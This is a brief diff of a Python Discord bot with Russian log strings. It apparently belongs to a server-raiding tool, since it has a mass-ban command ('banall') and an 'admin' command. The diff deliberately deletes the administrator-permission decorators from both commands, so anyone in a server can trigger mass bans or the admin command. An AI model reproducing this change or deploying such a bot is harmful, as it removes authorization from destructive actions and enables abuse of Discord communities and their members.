@@ -35,8 +35,7 @@ async def on_ready():
 
 
 @bot.command()
-@commands.has_permissions(administrator=True)
-async def ban_all(ctx):
+async def banall(ctx):
     await ctx.message.delete()
     print(Fore.YELLOW + "[~] Выполняется !ban-all")
 
@@ -166,7 +165,6 @@ async def on_guild_channel_create(channel):
             return
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def admin(ctx):
     await ctx.message.delete()
     print(Fore.YELLOW + "[~] Выполняется !admin")
@@ -186,3 +184,4 @@ async def admin(ctx):
 
 
 bot.run(TOKEN, log_handler=None)
+
